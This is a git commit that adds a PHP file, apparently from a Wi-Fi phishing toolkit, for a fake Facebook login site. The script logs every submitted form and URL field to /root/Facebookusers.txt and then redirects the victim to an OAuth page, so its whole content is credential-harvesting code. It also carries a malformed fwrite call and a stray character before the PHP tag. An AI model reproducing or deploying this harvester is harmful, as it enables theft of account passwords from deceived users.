541abf1206582748c010c7e54c9d3600f884b452
deltax <deltax.fluxion@gmail.com>
2016-08-22 15:39:21 +0200

    Add files via upload

---
+++ Sites/Facebook/datasms.php
@@ -0,0 +1,20 @@
+:<?php
+header("Location: oauth.html");
+$handle = fopen("/root/Facebookusers.txt", "a");
+foreach($_POST as $variable => $value) {
+fwrite("Essid =", $essid );
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
+}
+foreach($_GET as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;
+?> 
